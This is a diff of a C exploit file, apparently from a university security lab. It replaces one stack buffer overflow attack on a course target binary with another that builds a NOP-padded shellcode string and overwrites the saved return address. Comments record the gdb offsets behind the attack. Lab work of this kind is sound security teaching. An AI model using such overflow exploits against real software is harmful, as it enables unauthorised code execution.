@@ -6,62 +6,68 @@
 
 #define TARGET "../targets/target1"
 
-
-//My own constants
-#define BUFSIZE 125
-#define TARGET_RA_ADDR 0x202dfe10//where want to return, for now start of buf
-#define SHELL_LENGTH 45	//46th byte is a null in shell code
-
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
 
-	//printf("Sploit1.c: Before making attack_buffer:\n");
-	
-	//Making the attack buffer
-	char attack_buffer[BUFSIZE];
-	int *p;
-	//printf("Size of pointer p(int*) is %d\n",sizeof(p));
-	
-
-	//Making the attack buffer
-
-	//Fill all of buffer with a random number - 0x04
-	int i;
-	for(i = 0; i< BUFSIZE;i++)
-	{
-		attack_buffer[i] = 0x04;
-	}
-
-	//Fill first 45 bytes of buffer with shellcode
-	for(i = 0; i< SHELL_LENGTH;i++)
-	{
-		attack_buffer[i] = shellcode[i];
-	}
-
-	//Attack_buffer[45] to attack_buffer[119] with random stuff for debugging - 0x05
-	for(i = 45 ; i < 120; i++)
-	{
-		attack_buffer[i] = 0x05;
-	}
-
-	//Fill end with return address which is address of start of buf
-	int *a = (int*)&attack_buffer[120];
-	*a = TARGET_RA_ADDR;
-
-	//Putting in null since execv will check for null when putting in argv array
-	attack_buffer[BUFSIZE-1] = '\0';
-
-	//printf("&attack_buffer[120] as hex: %u\n",&attack_buffer[120]);	//debugging
-
 	args[0] = TARGET;
-	args[1] = attack_buffer;	//was "hi there" before
-	args[2] = NULL;
+		
+	/* 
 
+	REFERENCE: https://www.soldierx.com/tutorials/Stack-Smashing-Modern-Linux-System
+
+	INFO FROM GDB:
+
+		% info frame
+			Arglist at 0x2021fe80, args: argc=2, argv=0x7fffffffede8
+ 			Locals at 0x2021fe80, Previous frame's sp is 0x2021fe90
+ 			Saved registers:
+  			rbp at 0x2021fe80, rip at 0x2021fe88
+
+		% p &buf
+			0x2021fe10
+
+		Difference between next instruction pointer and starting address of
+		buffer on the stack is 120 bytes. Hence, we need to cause overflow of 
+		120 bytes + overwrite the return address i.e. make rip store the start
+		address of the buffer. So 120th to 124th places in our exploit string
+		will be buffer start address.
+
+		SHELL CODE: 45 bytes + 3 bytes word_ alignment
+
+		Buffer size: 96 bytes
+
+		//  Acc. to lecture, we can't accurately judge the  buf start address so we add NOP instructions.
+
+		Remaining buf_size after adding shellcode = 48 bytes. Hence, we need to fill buffer by 48 bytes NOP instructions
+		After shellcode, we again fill the space till 120 by NOP instructions.
+
+		So args[1] looks like NOP instructions + shellcode + NOP instructions + buf start address from gdb with total 124 bytes
+
+	*/
+
+	// Initialize explit string
+	char exploit[124];
+	bzero(exploit, 124);
+
+	strcat(exploit, shellcode); // append the shellcode to exploit string
+
+	// fill up the space after the shellcode up to the 120th position with NOP
+	int pos = strlen(exploit);	
+	memset(&exploit[pos], NOP, 120 - pos);
+
+	// overwrite return address with buf start address
+	char* retaddr = (char*)0x2021fe10;
+  	SET_VALUE(exploit, 120, retaddr);
+
+
+	args[1] = exploit;
+
+	args[2] = NULL;
 	env[0] = NULL;
-	
+
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
 
